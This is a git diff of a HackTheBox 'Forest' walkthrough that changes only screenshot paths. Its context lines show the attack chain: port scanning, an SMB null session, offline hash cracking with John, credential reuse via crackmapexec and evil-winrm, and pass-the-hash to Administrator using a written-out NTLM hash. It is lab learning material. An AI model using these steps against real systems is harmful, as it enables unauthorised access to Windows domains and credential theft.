@@ -62,7 +62,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.210 -oG allPorts
 - `-Pn`: Skip host discovery  
 - `-oG`: Output in grepable format
 
-![nmap](cases/HackTheBox/Machines/EASY/Forest/screenshots/nmap.png)
+![nmap](screenshots/nmap.png)
 
 Extract open ports:
 
@@ -70,7 +70,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Forest/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -85,7 +85,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format
 
-![targeted](cases/HackTheBox/Machines/EASY/Forest/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -130,7 +130,7 @@ We attempt a null session with `smbclient`:
 smbclient -L 10.129.95.210 -N
 ```
 
-![smbclient_null](cases/HackTheBox/Machines/EASY/Forest/screenshots/smbclient_null.png)
+![smbclient_null](screenshots/smbclient_null.png)
 
 Login succeeds but no useful shares are exposed. We add the domain to `/etc/hosts`:
 
@@ -230,7 +230,7 @@ We crack the hash offline with John the Ripper:
 john -w:/usr/share/wordlists/rockyou.txt hash
 ```
 
-![john_hash](cases/HackTheBox/Machines/EASY/Forest/screenshots/john_hash.png)
+![john_hash](screenshots/john_hash.png)
 
 **Password found:** `s3rvice`
 
@@ -253,7 +253,7 @@ Credentials are valid, but the user is not admin on the box. We check the availa
 crackmapexec smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' --shares
 ```
 
-![crackmapexec_shares](cases/HackTheBox/Machines/EASY/Forest/screenshots/crackmapexec_shares.png)
+![crackmapexec_shares](screenshots/crackmapexec_shares.png)
 
 Only read access â€” no relevant information in these folders.
 
@@ -276,7 +276,7 @@ evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 
 ![evilwinrm_login](evilwinrm_login.png)
 
-![user_flag](cases/HackTheBox/Machines/EASY/Forest/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -377,7 +377,7 @@ We use Pass-the-Hash with Evil-WinRM to get a shell as Administrator:
 evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Forest/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
